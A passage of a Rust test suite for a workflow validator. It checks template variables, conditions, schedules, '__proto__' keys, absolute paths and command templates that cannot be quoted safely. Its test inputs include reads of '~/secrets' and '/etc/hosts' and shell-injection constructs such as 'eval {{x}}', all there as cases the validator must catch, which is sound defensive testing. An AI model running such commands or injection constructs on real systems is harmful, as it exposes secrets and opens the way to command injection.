        "{{inputs.project}} {{run.id}} {{run.round}} {{run.status}} {{run.statusLabel}} {{run.name}} {{run.endedAt}} {{results}} {{results.0.status}} {{fetch.tickets}} {{each.results}}",
    );
    assert_eq!(validate_workflow(&ok), vec![]);
    // A step inside a For each is only reachable through results.
    assert!(messages(&with_template("{{dev.pr_url}}")).contains(
        &r#"The report cannot read "dev.pr_url": steps inside a For each are listed in {{results}} (or use {{each.results}})."#.to_string()
    ));
    assert!(flags(
        &with_template("{{dev}}"),
        r#"The report cannot read "dev""#
    ));
    // The loop variable only exists inside the For each.
    assert!(flags(
        &with_template("{{item.title}}"),
        r#"The report cannot read "item.title""#
    ));
    assert!(messages(&with_template("{{item.title}}")).contains(
        &r#"The report cannot read "item.title": the loop variable only exists inside a For each; use {{results}}."#.to_string()
    ));
    // Undeclared fields of top-level nodes are still caught.
    assert!(flags(&with_template("{{fetch.nope}}"), "{{fetch.nope}}"));
    // The conditions of #if blocks are checked too.
    assert!(flags(
        &with_template("{{#if dev.verdict}}x{{/if}}"),
        r#"The report cannot read "dev.verdict""#
    ));
}

#[test]
fn checks_variables_in_if_conditions_for_each_in_and_loop_deciders() {
    assert!(flags(
        &patch_node(&example(), "each", r#"{"in":"{{fetch.nope}}"}"#),
        "{{fetch.nope}}"
    ));
    let mut w = example();
    w.nodes.push(node(
        r#"{"id":"gate","type":"if","condition":"{{ghost.x}} == \"a\""}"#,
    ));
    w.edges.push(edge(r#"{"from":"fetch","to":"gate"}"#));
    assert!(flags(&w, "{{ghost.x}}"));
    let mut looped = example();
    loop_edge(&mut looped).decide = r#"{{review.nope}} == "x""#.into();
    assert!(flags(&looped, "{{review.nope}}"));
    loop_edge(&mut looped).decide = r#"{{review.verdict}} != "approve""#.into();
    assert_eq!(validate_workflow(&looped), vec![]);
}

#[test]
fn flags_an_if_condition_or_loop_decider_that_does_not_follow_the_condition_grammar() {
    for condition in [
        "{{review.verdict}} == approve",
        r#"{{review.verdict}} == "a" and {{review.issues}} not empty"#,
        "{{review.verdict}} >> 3",
        r#"{{review.verdict}} == "unterminated"#,
        "{{review.verdict}} == 'single'",
    ] {
        let mut gate = example();
        gate.nodes.push(node(
            &json!({"id": "gate", "type": "if", "condition": condition}).to_string(),
        ));
        gate.edges.push(edge(r#"{"from":"fetch","to":"gate"}"#));
        let issues: Vec<_> = validate_workflow(&gate)
            .into_iter()
            .filter(|i| i.message.contains("Cannot parse condition"))
            .collect();
        assert_eq!(issues.len(), 1, "{condition}");
        assert_eq!(issues[0].node_id.as_deref(), Some("gate"));

        let mut looped = example();
        loop_edge(&mut looped).decide = condition.into();
        let loop_issues: Vec<_> = messages(&looped)
            .into_iter()
            .filter(|m| m.contains("Cannot parse condition"))
            .collect();
        assert_eq!(loop_issues.len(), 1, "{condition}");
        assert!(loop_issues[0].contains("Loop edge"));
    }
}

#[test]
fn accepts_every_operator_of_the_condition_grammar() {
    for condition in [
        "{{fetch.tickets}} not empty",
        "{{fetch.tickets}} empty",
        r#"{{fetch.tickets}} contains "x""#,
        "{{fetch.tickets}} == 3",
        "{{fetch.tickets}} != true",
    ] {
        let mut w = example();
        w.nodes.push(node(
            &json!({"id": "gate", "type": "if", "condition": condition}).to_string(),
        ));
        w.edges.push(edge(r#"{"from":"fetch","to":"gate"}"#));
        assert!(
            !messages(&w)
                .iter()
                .any(|m| m.contains("Cannot parse condition")),
            "{condition}"
        );
    }
}

#[test]
fn flags_absolute_project_path_users_x_repo() {
    let w = patch_node(&example(), "fetch", r#"{"project":"/Users/x/repo"}"#);
    assert!(flags(&w, "absolute path"));
    assert!(messages(&w).contains(
        &"project is an absolute path; it must be {{inputs.<name>}} naming a project input"
            .to_string()
    ));
}

#[test]
fn flags_a_project_that_is_not_a_project_input() {
    assert!(flags(
        &patch_node(&example(), "fetch", r#"{"project":"repo"}"#),
        "{{inputs."
    ));
    assert!(flags(
        &patch_node(
            &example(),
            "fetch",
            r#"{"project":"{{inputs.clickupList}}"}"#
        ),
        "project input"
    ));
    assert!(flags(
        &patch_node(&example(), "fetch", r#"{"project":"{{inputs.nope}}"}"#),
        "project input"
    ));
    for odd in [
        "{{inputs.a b}}",
        "{{inputs.a.b}}",
        "{{inputs.}}",
        "x{{inputs.project}}",
        "{{inputs.project}}\n",
    ] {
        let w = patch_node(&example(), "fetch", &json!({"project": odd}).to_string());
        assert!(
            messages(&w).contains(
                &"project must be exactly {{inputs.<name>}} naming a project input".to_string()
            ),
            "{odd:?}"
        );
    }
}

#[test]
fn flags_absolute_paths_in_other_node_fields() {
    let w = patch_node(
        &example(),
        "fetch",
        r#"{"prompt":"Read /Users/x/repo/notes.md first"}"#,
    );
    assert!(flags(&w, "absolute path"));
    assert!(messages(&w).contains(
        &r#"prompt contains an absolute path ("/Users/x/repo/notes.md"); use a project input or a relative path"#.to_string()
    ));
    assert!(flags(&with_command("cat ~/secrets"), "absolute path"));
    assert!(!flags(
        &patch_node(
            &example(),
            "fetch",
            r#"{"prompt":"GET /api/users and https://x.dev/home/a"}"#
        ),
        "absolute path"
    ));
}

#[test]
fn flags_if_without_true_false_handles() {
    let mut w = example();
    w.nodes.push(node(
        r#"{"id":"gate","type":"if","condition":"{{fetch.tickets}} not empty"}"#,
    ));
    w.edges.push(edge(r#"{"from":"fetch","to":"gate"}"#));
    w.edges.push(edge(r#"{"from":"gate","to":"report"}"#));
    assert!(flags(&w, "handle"));
    for e in w.edges.iter_mut().filter(|e| e.from == "gate") {
        e.handle = Some(Handle::True);
    }
    assert_eq!(validate_workflow(&w), vec![]);
}

#[test]
fn flags_an_if_with_both_or_neither_of_condition_and_decide() {
    let mut base = example();
    base.nodes.push(node(r#"{"id":"gate","type":"if"}"#));
    base.edges.push(edge(r#"{"from":"fetch","to":"gate"}"#));
    assert!(flags(&base, "condition or decide"));
    let both = patch_node(&base, "gate", r#"{"condition":"a == b","decide":"mono"}"#);
    assert!(flags(&both, "condition or decide"));
    assert_eq!(
        validate_workflow(&patch_node(&base, "gate", r#"{"decide":"mono"}"#)),
        vec![]
    );
    // A blank condition counts as none.
    assert!(flags(
        &patch_node(&base, "gate", r#"{"condition":"   "}"#),
        "condition or decide"
    ));
}

#[test]
fn flags_a_handle_on_an_edge_that_does_not_leave_an_if() {
    let mut w = example();
    for e in w.edges.iter_mut().filter(|e| e.from == "fetch") {
        e.handle = Some(Handle::True);
    }
    assert!(flags(&w, "handle"));
}

#[test]
fn flags_duplicate_and_malformed_node_ids() {
    let mut dup = example();
    dup.nodes.push(node(r#"{"id":"fetch","type":"manual"}"#));
    assert!(flags(&dup, "Duplicate node id"));
    let bad = patch_node(&example(), "fetch", r#"{"id":"Fetch-1"}"#);
    assert!(flags(&bad, "node id"));
    assert!(messages(&bad).contains(
        &r#"Invalid node id "Fetch-1": use lowercase letters, digits and underscores, starting with a letter (max 40)"#.to_string()
    ));
}

#[test]
fn flags_edges_with_a_missing_endpoint() {
    let mut w = example();
    w.edges.push(edge(r#"{"from":"fetch","to":"ghost"}"#));
    assert!(flags(&w, "ghost"));
    assert!(messages(&w)
        .contains(&r#"Edge fetch -> ghost points at "ghost", which does not exist"#.to_string()));
}

#[test]
fn flags_a_parent_that_is_not_a_for_each() {
    assert!(flags(
        &patch_node(&example(), "dev", r#"{"parent":"fetch"}"#),
        "For each"
    ));
    assert!(flags(
        &patch_node(&example(), "dev", r#"{"parent":"ghost"}"#),
        "ghost"
    ));
}

#[test]
fn flags_references_to_missing_session_nodes() {
    assert!(flags(
        &patch_node(
            &example(),
            "review",
            r#"{"checkout":{"worktreeOf":"ghost"}}"#
        ),
        "ghost"
    ));
    assert!(flags(
        &patch_node(&example(), "review", r#"{"nestUnder":"ghost"}"#),
        "ghost"
    ));
    let w = patch_node(&example(), "review", r#"{"nestUnder":"each"}"#);
    assert!(messages(&w).contains(&r#"nestUnder "each" must be a session node"#.to_string()));
    let c = patch_node(
        &with_command("true"),
        "lint",
        r#"{"cwd":{"worktreeOf":"ghost"}}"#,
    );
    assert!(messages(&c).contains(&r#"cwd worktreeOf "ghost" does not exist"#.to_string()));
}

#[test]
fn rejects_node_ids_that_would_shadow_template_variables() {
    for id in ["run", "inputs", "results"] {
        let w = patch_node(&example(), "review", &format!(r#"{{"id":"{id}"}}"#));
        assert!(flags(&w, "reserved"), "{id}");
    }
}

#[test]
fn flags_an_invalid_schedule() {
    let w = patch_node(
        &example(),
        "trigger",
        r#"{"schedule":{"scheduleKind":"monthly","time":"9am","minute":0,"dayOfWeek":1}}"#,
    );
    assert!(flags(&w, "schedule"));
    assert!(messages(&w).contains(
        &"Invalid schedule: schedule.kind must be hourly, daily, weekdays, weekly or interval"
            .to_string()
    ));
}

#[test]
fn schedule_errors_match_the_habit_schedule_messages() {
    let schedule = |body: &str| {
        let w = patch_node(&example(), "trigger", &format!(r#"{{"schedule":{body}}}"#));
        messages(&w)
    };
    assert_eq!(
        schedule(r#"{"scheduleKind":"daily","time":"9am"}"#),
        [r#"Invalid schedule: schedule.time must be 24-hour "HH:MM""#]
    );
    assert_eq!(
        schedule(r#"{"scheduleKind":"daily","minute":60}"#),
        ["Invalid schedule: schedule.minute must be 0-59"]
    );
    assert_eq!(
        schedule(r#"{"scheduleKind":"daily","minute":-1}"#),
        ["Invalid schedule: schedule.minute must be 0-59"]
    );
    assert_eq!(
        schedule(r#"{"scheduleKind":"daily","minute":1.5}"#),
        ["Invalid schedule: schedule.minute must be 0-59"]
    );
    assert_eq!(
        schedule(r#"{"scheduleKind":"weekly","dayOfWeek":7}"#),
        ["Invalid schedule: schedule.dayOfWeek must be 0 (Sunday) to 6"]
    );
    assert_eq!(
        schedule(r#"{"scheduleKind":"daily","intervalHours":4}"#),
        [r#"Invalid schedule: schedule.hours only applies to kind "interval""#]
    );
    assert_eq!(
        schedule(r#"{"scheduleKind":"interval"}"#),
        [
            r#"Invalid schedule: schedule.hours is required for kind "interval": an integer from 1 to 24"#
        ]
    );
    for hours in ["0", "25", "2.5", "-3", "1000"] {
        assert_eq!(
            schedule(&format!(
                r#"{{"scheduleKind":"interval","intervalHours":{hours}}}"#
            )),
            ["Invalid schedule: schedule.hours must be an integer from 1 to 24"],
            "{hours}"
        );
    }
}

#[test]
fn accepts_an_interval_schedule() {
    let w = patch_node(
        &example(),
        "trigger",
        r#"{"schedule":{"scheduleKind":"interval","time":"00:00","minute":0,"dayOfWeek":1,"intervalHours":6,"intervalFrom":"2026-01-01"}}"#,
    );
    assert_eq!(validate_workflow(&w), vec![]);
}

#[test]
fn flags_input_names_that_cannot_be_used_in_a_variable() {
    let mut w = example();
    w.inputs
        .insert("bad.name", WorkflowInput::new(InputType::String));
    assert!(flags(&w, "input name"));
}

#[test]
fn flags_an_empty_ask_mono_answer_list_and_an_empty_for_each_list_expression() {
    let mut w = example();
    w.nodes.push(node(
        r#"{"id":"ask","type":"askMono","question":"ok?","answers":[]}"#,
    ));
    w.edges.push(edge(r#"{"from":"fetch","to":"ask"}"#));
    assert!(flags(&w, "answer"));
    assert!(flags(
        &patch_node(&example(), "each", r#"{"in":""}"#),
        "input list"
    ));
    assert!(flags(
        &patch_node(&example(), "each", r#"{"in":"  "}"#),
        "input list"
    ));
}

#[test]
fn never_panics_on_a_workflow_with_odd_fields() {
    let mut w = example();
    w.edges.push(edge(r#"{"from":"each","to":"each"}"#));
    assert!(flags(&w, "cycle"));
    // A parent chain that loops back on itself, a self parent, and a missing trigger and report.
    let mut odd = example();
    odd.nodes = vec![
        node(r#"{"id":"a","type":"forEach","in":"{{b.x}}","parent":"b"}"#),
        node(r#"{"id":"b","type":"forEach","in":"{{a.results}}","parent":"a"}"#),
        node(
            r#"{"id":"c","type":"session","project":"p","prompt":"{{c.x}} {{","checkout":{"worktreeOf":"c"},"output":{},"parent":"c"}"#,
        ),
    ];
    odd.edges = vec![
        edge(r#"{"from":"a","to":"a","loop":{"maxRounds":1,"decide":""}}"#),
        edge(r#"{"from":"c","to":"zzz","loop":{"maxRounds":1,"decide":"mono"}}"#),
    ];
    assert!(!validate_workflow(&odd).is_empty());
}

#[test]
fn an_unknown_loop_condition_scope_includes_the_loop_body() {
    // review reads dev's output of the same round and dev reads review's of the previous one.
    let w = example();
    assert_eq!(validate_workflow(&w), vec![]);
    let outside = patch_node(&w, "fetch", r#"{"prompt":"{{review.verdict}}"}"#);
    assert!(flags(&outside, "not upstream"));
}

// ---------------------------------------------------------------------------------------------
// validateWorkflow absolute paths in commands
// ---------------------------------------------------------------------------------------------

#[test]
fn flags_absolute_paths_in_commands() {
    for command in [
        "make >/tmp/log",
        "make 2>/var/log/x",
        "make;/usr/bin/x",
        "make|/usr/bin/x",
        "cd /srv/app && make",
        "cd /tmp",
        "make &>/srv/out",
        "cat </etc/hosts",
        "make --out=/srv/out",
        "cd ~/work && make",
    ] {
        assert!(flags(&with_command(command), "absolute path"), "{command}");
    }
}

#[test]
fn does_not_flag_urls_relative_paths_or_discarded_output() {
    for command in [
        "curl https://example.com/a/b {{inputs.clickupList}}",
        "curl -s http://localhost:3000/health",
        "git commit -m {{inputs.clickupList}}",
        "make 2>/dev/null",
        "make >/dev/null 2>&1",
        "ls ./src/features && cat docs/a.md",
        "echo $((6 / 3))",
    ] {
        assert!(!flags(&with_command(command), "absolute path"), "{command}");
    }
}

#[test]
fn flags_a_path_only_after_shell_operators_in_prose_prompts_too() {
    let w = patch_node(
        &example(),
        "fetch",
        r#"{"prompt":"Write the log to >/tmp/log"}"#,
    );
    assert!(flags(&w, "absolute path"));
}

#[test]
fn the_absolute_path_matchers_agree_with_the_regexes() {
    // find_absolute_path: delimiter before the path, trimmed result.
    for (text, found) in [
        ("/Users/x/repo", Some("/Users/x/repo")),
        (
            "see /Users/x/repo/notes.md first",
            Some("/Users/x/repo/notes.md"),
        ),
        ("a=/tmp/x b", Some("=/tmp/x")),
        ("(~/work)", Some("(~/work)")),
        ("C:\\Users\\x", Some("C:\\Users\\x")),
        ("d:/data", Some("d:/data")),
        ("x C:/a", Some("C:/a")),
        (":C:/x", Some(":C:/x")),
        ("/api/users", None),
        ("/Usersx/a", None),
        ("/home", None),
        ("https://x.dev/home/a", None),
        ("a/Users/b/c", None),
        ("ab:/x", None),
        ("", None),
        ("~", None),
    ] {
        assert_eq!(find_absolute_path(text).as_deref(), found, "{text:?}");
    }
    // The command variant: any /word, ~/ or drive, except // and the discard devices.
    for (command, flagged) in [
        ("cd /x", true),
        ("cd /", false),
        ("cd / x", false),
        ("a //x", false),
        ("a >/dev/null", false),
        ("a >/dev/stdout", false),
        ("a >/dev/null2", true),
        ("a >/dev/nullx", true),
        ("a >/dev/null.log", true),
        ("a >/dev/null/x", true),
        ("a >/dev/tty", true),
        ("a >/dev/", true),
        ("/usr/bin/x", true),
        ("ls ~/x", true),
        ("ls ~x", false),
        ("a=/b", true),
        ("(/b)", true),
        ("echo 5/3", false),
    ] {
        let w = with_command(command);
        assert_eq!(flags(&w, "absolute path"), flagged, "{command}");
    }
}

// ---------------------------------------------------------------------------------------------
// prototype-like map keys
// ---------------------------------------------------------------------------------------------

#[test]
fn parse_workflows_skips_a_proto_input_or_output_key() {
    let body = r#"[{"id":"wf-aaaaaaaa","nodes":[{"id":"s","type":"session","project":"p","prompt":"x",
        "checkout":"root","output":{"__proto__":{"type":"string"},"ok":{"type":"string"}}}],
        "inputs":{"__proto__":{"type":"project"},"p":{"type":"project"}},
        "inputValues":{"__proto__":"x","p":"y"}}]"#;
    let w = &parse_workflows(body)[0];
    assert_eq!(w.inputs.keys().collect::<Vec<_>>(), ["p"]);
    assert_eq!(w.input_values.keys().collect::<Vec<_>>(), ["p"]);
    let NodeKind::Session { output, .. } = &w.nodes[0].kind else {
        unreachable!()
    };
    assert_eq!(output.keys().collect::<Vec<_>>(), ["ok"]);
}

#[test]
fn a_project_that_names_an_inherited_key_is_not_a_project_input() {
    for name in ["__proto__", "constructor", "toString"] {
        let w = patch_node(
            &example(),
            "fetch",
            &json!({"project": format!("{{{{inputs.{name}}}}}")}).to_string(),
        );
        assert!(flags(&w, "project input"), "{name}");
    }
}

#[test]
fn flags_a_proto_input_name() {
    let mut w = example();
    w.inputs
        .insert("__proto__", WorkflowInput::new(InputType::String));
    assert!(flags(&w, "input name"));
    assert!(messages(&w).contains(
        &r#"Invalid input name "__proto__": use letters, digits and underscores"#.to_string()
    ));
}

#[test]
fn flags_invalid_output_field_names() {
    let mut w = example();
    match &mut node_mut(&mut w, "fetch").kind {
        NodeKind::Session { output, .. } => {
            output.insert("bad.name", OutputField::new(OutputFieldType::String))
        }
        _ => unreachable!(),
    }
    assert!(messages(&w).contains(
        &r#"Invalid output field name "bad.name": use letters, digits and underscores"#.to_string()
    ));
}

// ---------------------------------------------------------------------------------------------
// validateWorkflow command templates
// ---------------------------------------------------------------------------------------------

#[test]
fn flags_a_variable_inside_double_quotes() {
    let issues = validate_workflow(&with_command(r#"echo "{{inputs.clickupList}}""#));
    assert!(issues
        .iter()
        .any(|i| i.node_id.as_deref() == Some("lint") && i.message.contains("double quotes")));
}

#[test]
fn accepts_a_bare_variable() {
    assert_eq!(
        validate_workflow(&with_command("echo {{inputs.clickupList}}")),
        vec![]
    );
}

#[test]
fn flags_unquotable_shell_syntax_and_conditionals() {
    assert!(!messages(&with_command("echo $(date) {{inputs.clickupList}}")).is_empty());
    assert!(flags(
        &with_command("{{#if inputs.clickupList}}make{{/if}}"),
        "conditionals"
    ));
}

#[test]
fn still_resolves_variables_in_a_command() {
    assert!(flags(&with_command("echo {{ghost.x}}"), "{{ghost.x}}"));
    assert_eq!(
        validate_workflow(&with_command("echo {{fetch.tickets}}")),
        vec![]
    );
}

// ---------------------------------------------------------------------------------------------
// template_vars and shell_template_problems (workflowTemplate.test.ts, the parts validation uses)
// ---------------------------------------------------------------------------------------------

#[test]
fn template_vars_lists_all_vars_once_in_order() {
    let tpl =
        "{{dev.pr_url}} {{#if item.title}}{{item.title}} {{inputs.project}}{{/if}} {{dev.pr_url}}";
    assert_eq!(
        template_vars(tpl),
        ["dev.pr_url", "item.title", "inputs.project"]
    );
}

#[test]
fn template_vars_edge_cases() {
    assert_eq!(template_vars("{{ a.b }} {{#if   x }}{{/if}}"), ["a.b", "x"]);
    assert_eq!(
        template_vars("{{}} {{ }} {{a b}} {{a"),
        Vec::<String>::new()
    );
    assert_eq!(template_vars("{{/if}} {{/x}}"), Vec::<String>::new());
    assert_eq!(template_vars("{{#if}}"), ["#if"]);
    assert_eq!(template_vars("{{#ifx}}"), ["#ifx"]);
    // A `{{a}}` inside extra braces is still found.
    assert_eq!(template_vars("{{{a}}}"), ["a"]);
    assert_eq!(template_vars("{{{a b}}}"), Vec::<String>::new());
    assert_eq!(template_vars("{{{{a}}"), ["a"]);
    assert_eq!(template_vars("é{{é.ü}}日"), ["é.ü"]);
    // \s is the JS set: a no-break space separates, NEL does not.
    assert_eq!(template_vars("{{\u{a0}a\u{a0}}}"), ["a"]);
    assert_eq!(template_vars("{{\u{85}a}}"), ["\u{85}a"]);
}

fn mentions_x(problems: &[String]) -> bool {
    problems.iter().any(|p| p.contains("{{x}}"))
}

#[test]
fn shell_problems_flag_a_var_inside_double_quotes() {
    let problems = shell_template_problems(r#"echo "{{x}}""#);
    assert_eq!(problems.len(), 1);
    assert!(problems[0].contains("{{x}}"));
    assert!(problems[0].contains("double quotes"));
    assert_eq!(
        problems[0],
        "{{x}} is inside double quotes; write it bare, the app quotes it for the shell"
    );
}

#[test]
fn shell_problems_flag_a_var_inside_single_quotes_and_backticks() {
    assert_eq!(shell_template_problems("echo '{{x}}'").len(), 1);
    assert_eq!(shell_template_problems("echo `{{x}}`").len(), 1);
}

#[test]
fn shell_problems_keep_bare_usage_unflagged() {
    assert!(shell_template_problems("git commit -m {{msg}}").is_empty());
    assert!(shell_template_problems("git -C {{dir}} log --format='%h' {{ref}}").is_empty());
}

#[test]
fn shell_problems_flag_every_var_when_the_text_has_syntax_it_cannot_follow() {
    for (name, tpl) in [
        ("a: comment with an apostrophe", "# don't\necho '{{x}}'"),
        (
            "b: nested quotes in a substitution",
            r#"echo "$(echo "{{x}}")""#,
        ),
        (
            "c: backslash before a var inside quotes",
            r#"echo "a\{{x}}""#,
        ),
        ("c: backslash before a bare var", "echo \\{{x}}"),
        ("d: unquoted heredoc", "cat <<EOF\n{{x}}\nEOF"),
        (
            "e: ANSI-C string with an escaped quote",
            "echo $'\\' {{x}} '",
        ),
        ("f1: dollar right before a var", "echo ${{x}}"),
        ("f1: dollar and space before a var", "echo ${{ x }}"),
        (
            "f3: comment after a closing paren",
            "(true)# don't\necho '{{x}}'",
        ),
        (
            "f3: comment after an opening paren",
            "(# don't\necho '{{x}}'",
        ),
        ("arithmetic expansion", "echo $[1+{{x}}]"),
        ("A: line continuation joins $ and a var", "echo $\\\n{{x}}"),
        (
            "A: line continuation joins a heredoc operator",
            "cat <\\\n<EOF\n{{x}}\nEOF",
        ),
        (
            "A: line continuation joins a nested substitution",
            "echo \"$\\\n(echo \"{{x}}\")\"",
        ),
        ("A: line continuation hides $[", "echo $\\\n[1+{{x}}]"),
        ("A: CRLF line continuation", "echo $\\\r\n{{x}}"),
        (
            "A: line continuation joins $ and a quote",
            "echo $\\\n'\\' {{x}} '",
        ),
        (
            "C: arithmetic command desyncs quotes in zsh and ksh (single)",
            "(( 1 ' )) ; echo ' {{x}} '",
        ),
        (
            "C: arithmetic command after ||",
            "true || (( 1 ' )) ; echo ' {{x}} '",
        ),
        (
            "C: arithmetic command (double)",
            "(( 1 \" )) ; echo \" {{x}} \"",
        ),
        (
            "B: nested double quotes inside a parameter expansion",
            r#"echo "${y:-"}{{x}}"}""#,
        ),
    ] {
        assert!(mentions_x(&shell_template_problems(tpl)), "{name}");
    }
}

#[test]
fn shell_problems_flag_every_var_next_to_syntax_that_re_parses_a_value() {
    for (name, tpl) in [
        ("double brackets", "if [[ {{x}} -gt 0 ]]; then echo hi; fi"),
        ("let", "let n={{x}}"),
        ("let after a separator", "true; let n={{x}}"),
        ("declare", "declare -i n={{x}}"),
        ("typeset", "typeset -i n={{x}}"),
        ("eval", "eval {{x}}"),
        ("eval after a pipe", "echo hi | eval {{x}}"),
        ("zsh glob qualifier after a star", "ls *(e:{{x}}:)"),
        ("zsh glob qualifier after a question mark", "ls ?(e:{{x}}:)"),
    ] {
        assert!(mentions_x(&shell_template_problems(tpl)), "{name}");
    }
}

#[test]
fn shell_problems_flag_a_zsh_glob_qualifier_written_as_word_paren() {
    assert!(mentions_x(&shell_template_problems("ls /tmp({{x}})")));
    assert!(mentions_x(&shell_template_problems(
        "ls /tmp/*.log(e:{{x}}:)"
    )));
}

#[test]
fn shell_problems_allow_parentheses_that_are_not_glob_qualifiers() {
    assert!(shell_template_problems("(cd sub && ls) {{x}}").is_empty());
    assert!(shell_template_problems(r#"git commit -m "fix(parser): done" {{x}}"#).is_empty());
    assert!(shell_template_problems("true && (echo hi) ; echo {{x}}").is_empty());
}

#[test]
fn shell_problems_do_not_mistake_other_words_for_let_declare_typeset_or_eval() {
    for tpl in [
        "npm run evaluate {{x}}",
        "echo outlet {{x}}",
        "npm run eval-all {{x}}",
        "cat declared.txt {{x}}",
        "git log --format=%h -n 1 {{x}} [a-z]*",
    ] {
        assert!(shell_template_problems(tpl).is_empty(), "{tpl}");
    }
}

#[test]
fn shell_problems_do_not_flag_a_bare_var_or_a_quote_pair_around_no_var() {
    assert!(shell_template_problems("echo {{x}}").is_empty());
    assert!(shell_template_problems(r#"echo "hi" {{x}}"#).is_empty());
    assert!(shell_template_problems("echo 'a b' {{x}} 'c'").is_empty());
}

#[test]
fn shell_problems_respect_backslash_escapes_outside_single_quotes() {
    assert!(shell_template_problems(r#"echo \"{{x}}"#).is_empty());
    assert_eq!(shell_template_problems(r#"echo "a\"{{x}}""#).len(), 1);
    assert!(shell_template_problems("echo 'a\\' {{x}}").is_empty());
}

#[test]
fn shell_problems_reject_conditionals_in_command_templates() {
    for (name, tpl) in [
        (
            "f2: comment formed when the #if body is dropped",
            "echo hi {{#if c}}z{{/if}}# don't\necho '{{x}}'",
        ),
        (
            "f2: ANSI-C quote formed when the #if body is dropped",
            "echo ${{#if c}}z{{/if}}'\\' {{x}} '",
        ),
        (
            "f2: heredoc formed when the #if body is dropped",
            "cat <{{#if c}}z{{/if}}<EOF\n{{x}}\nEOF",
        ),
        (
            "f2: #if joins pieces into a var token",
            r#"echo "{{#if a}}{{{/if}}{x}}""#,
        ),
        ("plain #if", "echo {{#if a}}yes{{/if}} {{x}}"),
    ] {
        let problems = shell_template_problems(tpl);
        assert!(!problems.is_empty(), "{name}");
        assert!(
            problems.iter().any(|p| p.contains("conditionals")),
            "{name}"
        );
    }
    let plain = shell_template_problems("echo {{#if a}}yes{{/if}} {{x}}");
    assert_eq!(
        plain[0],
        "conditionals ({{#if}}) are not supported in command templates"
    );
    assert_eq!(
        plain[1],
        "{{x}}: conditionals ({{#if}}) are not supported in command templates"
    );
}

#[test]
fn shell_problems_say_why_when_the_syntax_is_unquotable() {
    assert_eq!(
        shell_template_problems("eval {{x}}"),
        ["{{x}}: the command uses shell syntax that cannot be quoted safely around variables; move the variable to a simple argument or pass it differently"]
    );
}

// ---------------------------------------------------------------------------------------------
// condition grammar (workflowCondition.test.ts, the parse errors)
// ---------------------------------------------------------------------------------------------

#[test]
fn a_parse_error_for_a_double_angle_operator_names_the_condition() {
    let err = condition_syntax_problem("{{a}} >> 3").unwrap();
    assert!(err.contains("{{a}} >> 3"));
    assert_eq!(
        err,
        r#"Cannot parse condition "{{a}} >> 3": expected ==, !=, contains, empty or not empty"#
    );
}

#[test]
fn conditions_reject_and_or_trailing_text_empty_input_and_unterminated_strings() {
    for bad in [
        "{{a}} == 1 and {{b}} == 2",
        "{{a}} == 1 or {{b}} == 2",
        "{{a}} empty extra",
        "{{a}} ==",
        "",
        "\"abc == \"abc",
        "{{a}} == \"abc",
        "{{a}",
        "yes == yes",
    ] {
        assert!(condition_syntax_problem(bad).is_some(), "{bad:?}");
    }
}

#[test]
fn condition_errors_carry_their_reason() {
    let reason = |c: &str| condition_syntax_problem(c).unwrap();
    assert!(reason("").ends_with("the condition is empty"));
    assert!(reason("   ").ends_with("the condition is empty"));
    assert!(reason("{{a}} == \"x").ends_with("unterminated string"));
    assert!(reason(r#"{{a}} == "\q""#).ends_with("invalid string escape"));
    assert!(reason("{{a}} == yes")
        .ends_with("expected {{path}}, a double-quoted string, a number, true or false"));
    assert!(reason("{{a}} empty extra")
        .ends_with("unexpected text after the operator (and/or are not supported)"));
    assert!(reason("{{a}} == 1 and 2")
        .ends_with("unexpected text after the second operand (and/or are not supported)"));
    assert!(reason("{{a}}").ends_with("expected ==, !=, contains, empty or not empty"));
}

#[test]
fn conditions_accept_the_operand_forms() {
    for ok in [
        r#"{{ inputs.name }}   ==   "release""#,
        r#"  {{a}} == "x"  "#,
        r#""a == b" == "a == b""#,
        r#""say \"hi\"" == "say \"hi\"""#,
        "{{a}} != -3",
        "{{a}} == 3.5",
        "{{a}} == true",
        "{{a}} != false",
        "{{a}} not   empty",
        "{{a}}\tnot\nempty",
        "{{a}} empty",
        "1 == 1",
    ] {
        assert_eq!(condition_syntax_problem(ok), None, "{ok:?}");
    }
    for bad in [
        "{{a}} == 3.",
        "{{a}} == 3x",
        "{{a}} == .5",
        "{{a}} == truex",
        "{{a}} notempty",
        "{{a}} contains",
        "{{a}} ==3",
    ] {
        assert!(condition_syntax_problem(bad).is_some(), "{bad:?}");
    }
}

#[test]
fn parse_condition_reads_operands() {
    let p = parse_condition(r#"{{ a.b }} == "x\ny""#).unwrap();
    assert_eq!(p.operator, "==");
    assert_eq!(p.left, Operand::Path("a.b".into()));
    assert_eq!(p.right, Some(Operand::Literal(json!("x\ny"))));
    let p = parse_condition("{{a}} != -3.5").unwrap();
    assert_eq!(p.right, Some(Operand::Literal(json!(-3.5))));
    let p = parse_condition("{{a}} != 3").unwrap();
    assert_eq!(p.right, Some(Operand::Literal(json!(3))));
    assert_eq!(
        parse_condition("{{a}} == true").unwrap().right,
        Some(Operand::Literal(json!(true)))
    );
    let p = parse_condition("{{a}}   not \t empty").unwrap();
    assert_eq!((p.operator.as_str(), p.right), ("not empty", None));
}

// ---------------------------------------------------------------------------------------------
// ordered map
// ---------------------------------------------------------------------------------------------

#[test]
fn ordered_map_keeps_insertion_order_and_compares_without_it() {
    let mut a: OrderedMap<i32> = OrderedMap::new();
    a.insert("z", 1);
    a.insert("a", 2);
    a.insert("z", 3);
    assert_eq!(
        a.iter().map(|(k, v)| (k.as_str(), *v)).collect::<Vec<_>>(),
        [("z", 3), ("a", 2)]
    );
    let b: OrderedMap<i32> = [("a", 2), ("z", 3)].into_iter().collect();
    assert_eq!(a, b);
    assert_eq!(serde_json::to_string(&a).unwrap(), r#"{"z":3,"a":2}"#);
    assert_eq!(a.remove("z"), Some(3));
    assert_ne!(a, b);
}

// ---------------------------------------------------------------------------------------------
// rendering (workflowTemplate.test.ts)
// ---------------------------------------------------------------------------------------------

/// A scope or value written as JSON text, keys kept in the written order.
fn jv(text: &str) -> Json {
    Json::parse(text).unwrap()
}

fn render(text: &str, scope: &str) -> String {
    render_template(text, &jv(scope), false)
}

fn render_shell(text: &str, scope: &str) -> String {
    render_template(text, &jv(scope), true)
}

#[test]
fn renders_nested_paths() {
    let scope = r#"{"dev":{"pr":{"url":"https://x/1"}},"inputs":{"n":3,"ok":true}}"#;
    assert_eq!(
        render("PR {{dev.pr.url}} n={{inputs.n}} ok={{inputs.ok}}", scope),
        "PR https://x/1 n=3 ok=true"
    );
}

#[test]
fn renders_lists_as_pretty_json() {
    assert_eq!(
        render("{{items}}", r#"{"items":["a","b"]}"#),
        "[\n  \"a\",\n  \"b\"\n]"
    );
